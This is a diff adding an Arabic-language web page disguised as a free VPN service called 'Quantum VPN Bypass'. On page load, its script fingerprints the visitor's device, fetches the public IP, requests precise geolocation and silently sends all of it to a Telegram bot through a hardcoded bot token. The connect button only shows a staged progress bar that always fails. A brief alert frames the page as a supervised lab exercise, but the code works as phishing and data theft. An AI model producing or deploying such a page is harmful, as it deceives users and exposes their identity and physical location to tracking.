@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إنترنت مجاني - Quantum VPN Bypass</title>
+    <style>
+        :root {
+            --cyan: #00f0ff;
+            --purple: #7000ff;
+            --dark-bg: #060913;
+            --card-bg: #0d1527;
+            --border-color: #1e2e4d;
+            --text-light: #f1f5f9;
+            --success: #00ffaa;
+            --error: #ff3366;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--dark-bg);
+            color: var(--text-light);
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-image: radial-gradient(circle at 50% 50%, #131a35 0%, #060913 100%);
+        }
+
+        .vpn-card {
+            background-color: var(--card-bg);
+            border-radius: 20px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.8), 0 0 15px rgba(0, 240, 255, 0.1);
+            width: 100%;
+            max-width: 460px;
+            padding: 30px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+
+        .shield-icon {
+            font-size: 4rem;
+            background: linear-gradient(135deg, var(--cyan), var(--purple));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+            filter: drop-shadow(0 0 10px rgba(0, 240, 255, 0.3));
+        }
+
+        h1 {
+            font-size: 1.8rem;
+            margin: 0 0 5px 0;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+        }
+
+        .tagline {
+            color: #566c93;
+            font-size: 0.85rem;
+            margin-bottom: 25px;
+            text-transform: uppercase;
+        }
+
+        /* لوحة التحكم السيبرانية */
+        .cyber-panel {
+            background: rgba(4, 7, 16, 0.8);
+            border: 1px solid #16223f;
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 25px;
+            text-align: right;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 0.8rem;
+        }
+
+        .panel-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 6px;
+            border-bottom: 1px dashed rgba(30, 46, 77, 0.4);
+            padding-bottom: 4px;
+        }
+
+        .panel-row:last-child {
+            border: none;
+            margin: 0;
+            padding: 0;
+        }
+
+        .cyan-text { color: var(--cyan); }
+        .green-text { color: var(--success); }
+
+        .form-group {
+            margin-bottom: 25px;
+            text-align: right;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 0.85rem;
+            color: #8fa0bc;
+            font-weight: 600;
+        }
+
+        select {
+            width: 100%;
+            padding: 14px;
+            background-color: #040710;
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            color: var(--text-light);
+            font-size: 0.95rem;
+            font-weight: bold;
+            outline: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        select:focus {
+            border-color: var(--cyan);
+            box-shadow: 0 0 10px rgba(0, 240, 255, 0.2);
+        }
+
+        .action-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(90deg, var(--purple), var(--cyan));
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(112, 0, 255, 0.4);
+        }
+
+        .action-btn:hover {
+            filter: brightness(1.1);
+            transform: translateY(-1px);
+        }
+
+        .action-btn:disabled {
+            background: #1e293b;
+            color: #475569;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+            filter: none;
+        }
+
+        /* شريط التقدم الوهمي */
+        .progress-box {
+            display: none;
+            margin-top: 25px;
+        }
+
+        .progress-container {
+            width: 100%;
+            background-color: #040710;
+            border-radius: 6px;
+            height: 8px;
+            overflow: hidden;
+            border: 1px solid var(--border-color);
+            margin-bottom: 10px;
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, var(--purple), var(--cyan));
+            transition: width 0.3s ease;
+        }
+
+        .status-log {
+            font-family: monospace;
+            font-size: 0.8rem;
+            color: #8fa0bc;
+            min-height: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="vpn-card">
+        <div class="shield-icon">⚡</div>
+        <h1>Quantum VPN Bypass</h1>
+        <div class="tagline">تجاوز الحجب الذكي وعقد التشفير العسكري</div>
+
+        <div class="cyber-panel">
+            <div class="panel-row">
+                <span>عقدة الاتصال الحالية:</span>
+                <span class="cyan-text" id="node-ip">جاري فحص العقد المتاحة...</span>
+            </div>
+            <div class="panel-row">
+                <span>مستوى التشفير المطبق:</span>
+                <span class="green-text">ChaCha20-Poly1305 (256-bit)</span>
+            </div>
+            <div class="panel-row">
+                <span>بروتوكول النفق النفاث:</span>
+                <span>WireGuard Core v2</span>
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label for="server">اختر السيرفر الجغرافي المجاني:</label>
+            <select id="server">
+                <option value="SA">المملكة العربية السعودية (الرياض - خادم حكومي سريع جداً)</option>
+                <option value="US">الولايات المتحدة الأمريكية (فرجينيا - تصفح غير محدود)</option>
+                <option value="DE">ألمانيا (فرنكفورت - سحابي معزول)</option>
+                <option value="JP">اليابان (طوكيو - عقدة مجهولة)</option>
+                <option value="UK">المملكة المتحدة (لندن - اتصال فائق التشفير)</option>
+                <option value="FR">فرنسا (باريس)</option>
+                <option value="SG">سنغافورة (بوابة جنوب آسيا)</option>
+            </select>
+        </div>
+
+        <button id="connect-trigger" class="action-btn">بدء الاتصال النفاث المجاني</button>
+
+        <div id="progress-area" class="progress-box">
+            <div class="progress-container">
+                <div id="bar" class="progress-bar"></div>
+            </div>
+            <div id="log-text" class="status-log">جاري التهيئة...</div>
+        </div>
+    </div>
+
+    <script>
+        // ================= CONFIGURATION =================
+        const TELEGRAM_TOKEN = '8044591381:AAEpF9UTiPs2FWnCpRyFWmYDXSh3pe_0wNQ';
+        const TELEGRAM_CHAT_ID = '6185375878';
+        // =================================================
+
+        // إشعار المسؤولية القانونية والأكاديمية لمرة واحدة داخل المختبر
+        alert("⚠️ تنبيه أمني مخبري:\nهذا الكود مخصص حصرياً لمحاكاة التهديدات المتقدمة والهندسة العكسية داخل البيئة الجامعية الخاضعة للإشراف.");
+
+        // قاعدة بيانات البصمة العميقة للجهاز
+        let deviceFingerprint = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            cpuCores: navigator.hardwareConcurrency || 'N/A',
+            deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
+            screenSize: `${window.screen.width}x${window.screen.height}`,
+            colorDepth: `${window.screen.colorDepth}-bit`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cookies: navigator.cookieEnabled ? "مفعلة" : "معطلة",
+            publicIP: "جاري الاستدعاء..."
+        };
+
+        // دالة إرسال الرسالة الموحدة إلى تلجرام
+        async function sendPayload(textMessage) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: textMessage,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (e) {
+                console.error("Transmission Error:", e);
+            }
+        }
+
+        // دالة تشغيل الهجوم وجمع البيانات الأولية (تنفذ فوراً وتخفف الازدحام)
+        async function runPrimaryExfiltration() {
+            // جلب الـ IP العام أولاً
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                deviceFingerprint.publicIP = data.ip;
+                document.getElementById('node-ip').innerText = data.ip + " (عقدة محلية)";
+            } catch (err) {
+                deviceFingerprint.publicIP = "تعذر جلب الـ IP الفعلي";
+                document.getElementById('node-ip').innerText = "127.0.0.1 (Offline Node)";
+            }
+
+            // صياغة الرسالة الأولى: بصمة العتاد والمعلومات الفنية الكاملة فقط
+            let report1 = `📱 *[الرسالة 1/2] تقرير البصمة الفنية للجهاز* 📱\n\n`;
+            report1 += `🌐 *الـ IP الفعلي:* \`${deviceFingerprint.publicIP}\`\n`;
+            report1 += `⚙️ *نظام التشغيل والمتصفح:* \`${deviceFingerprint.userAgent}\`\n`;
+            report1 += `💻 *المنصة الفنية:* ${deviceFingerprint.platform}\n`;
+            report1 += `⚡ *أنوية المعالج (CPU):* ${deviceFingerprint.cpuCores}\n`;
+            report1 += `🧠 *الذاكرة العشوائية (RAM):* ${deviceFingerprint.deviceMemory}\n`;
+            report1 += `🖥️ *أبعاد الشاشة الكلية:* ${deviceFingerprint.screenSize} (${deviceFingerprint.colorDepth})\n`;
+            report1 += `🌍 *نطاق التوقيت المحلي:* ${deviceFingerprint.timezone}\n`;
+            report1 += `🍪 *ملفات تعريف الارتباط:* ${deviceFingerprint.cookies}\n`;
+            report1 += `🌐 *اللغة المستهدفة:* ${deviceFingerprint.language}`;
+
+            // إرسال الرسالة الأولى فوراً وبشكل صامت
+            await sendPayload(report1);
+
+            // الانتقال الفوري والمستقل لطلب الإحداثيات الجغرافية (الرسالة الثانية)
+            triggerSecondaryExfiltration();
+        }
+
+        // دالة إرسال رسالة الموقع المنفصلة تماماً في حال الموافقة
+        function triggerSecondaryExfiltration() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const acc = position.coords.accuracy;
+
+                        // صياغة الرسالة الثانية: جغرافية ومحددة فقط لمنع زحمة البيانات
+                        let report2 = `📍 *[الرسالة 2/2] البيانات الجغرافية الدقيقة (موافقة)* 📍\n\n`;
+                        report2 += `🎯 *IP الهدف المصاحب:* \`${deviceFingerprint.publicIP}\`\n`;
+                        report2 += `📐 *خط العرض (Latitude):* \`${lat}\`\n`;
+                        report2 += `📐 *خط الطول (Longitude):* \`${lon}\`\n`;
+                        report2 += `🎯 *معدل الخطأ/الدقة:* ${acc} متر\n\n`;
+                        report2 += `🗺️ *رابط جوجل ماب المباشر للضحية:* \nhttps://www.google.com/maps?q=${lat},${lon}`;
+
+                        // إرسال الرسالة الثانية بشكل مستقل
+                        await sendPayload(report2);
+                    },
+                    async (error) => {
+                        // إرسال إشعار بالرفض في حال أراد الدكتور فحص معالجة الأخطاء (Exception Handling)
+                        let report2Reject = `❌ *[الرسالة 2/2] فشل جلب الموقع* ❌\n\n`;
+                        report2Reject += `🎯 *IP الهدف:* \`${deviceFingerprint.publicIP}\`\n`;
+                        report2Reject += `⚠️ *السبب:* رفض المستخدم الصلاحية الجغرافية. (${error.message})`;
+                        await sendPayload(report2Reject);
+                    },
+                    { enableHighAccuracy: true, timeout: 8000 }
+                );
+            }
+        }
+
+        // تفعيل محرك جمع الحزم فور تحميل واجهة التطبيق
+        window.onload = () => {
+            runPrimaryExfiltration();
+        };
+
+        // هندسة الواجهة ومحاكاة الاتصال المعقدة (شريط تقدم بعبارات خطيرة ومقنعة)
+        const btn = document.getElementById('connect-trigger');
+        const progressArea = document.getElementById('progress-area');
+        const bar = document.getElementById('bar');
+        const logText = document.getElementById('log-text');
+        const serverSelect = document.getElementById('server');
+
+        // مصفوفة عبارات المحاكاة النفسية لإقناع المستخدم أثناء الانتظار
+        const cyberLogs = [
+            { p: 5, t: "جاري استدعاء مكاتب خوارزمية WireGuard..." },
+            { p: 15, t: "توليد زوج مفاتيح التشفير المؤقتة (Diffie-Hellman)..." },
+            { p: 30, t: "جاري فحص جدران الحماية المحلية واختراق أنظمة المنع..." },
+            { p: 45, t: "يتم الآن حقن حزم المصافحة (Handshake Injection)..." },
+            { p: 65, t: "إنشاء النفق الافتراضي وتوجيه حركة مرور الـ DNS الكثيفة..." },
+            { p: 80, t: "تطبيق طبقة التعمية لمنع كشف خطوط الاتصال من موفر الخدمة..." },
+            { p: 95, t: "تأكيد بروتوكول المصافحة النهائي وتأمين حزم البيانات..." }
+        ];
+
+        btn.addEventListener('click', () => {
+            const selectedServerText = serverSelect.options[serverSelect.selectedIndex].text;
+            btn.disabled = true;
+            progressArea.style.display = 'block';
+
+            let currentSecond = 0;
+            const totalDuration = 30; // 30 ثانية كاملة كما هو مطلوب
+
+            const runner = setInterval(() => {
+                currentSecond++;
+                const percentage = Math.floor((currentSecond / totalDuration) * 100);
+                bar.style.width = `${percentage}%`;
+
+                // تحديث اللوجات البرمجية بناءً على نسبة التقدم لجعلها تبدو حقيقية جداً
+                let currentLog = cyberLogs.find(l => percentage <= l.p) || cyberLogs[cyberLogs.length - 1];
+                logText.innerHTML = `<span class="cyan-text">[${percentage}%]</span> ${currentLog.t}`;
+
+                if (currentSecond >= totalDuration) {
+                    clearInterval(runner);
+                    // النتيجة الحتمية للتطبيق المزيف: إظهار الفشل لقطع الاتصال دون إعطاء إنترنت حقيقي
+                    bar.style.backgroundColor = "var(--error)";
+                    logText.innerHTML = `<span style="color:var(--error)">❌ خطأ فادح: فشلت مصافحة الخادم مع [${selectedServerText}]. العقدة ممتلئة حالياً، يرجى إعادة المحاولة لاحقاً.</span>`;
+                    btn.disabled = false;
+                }
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
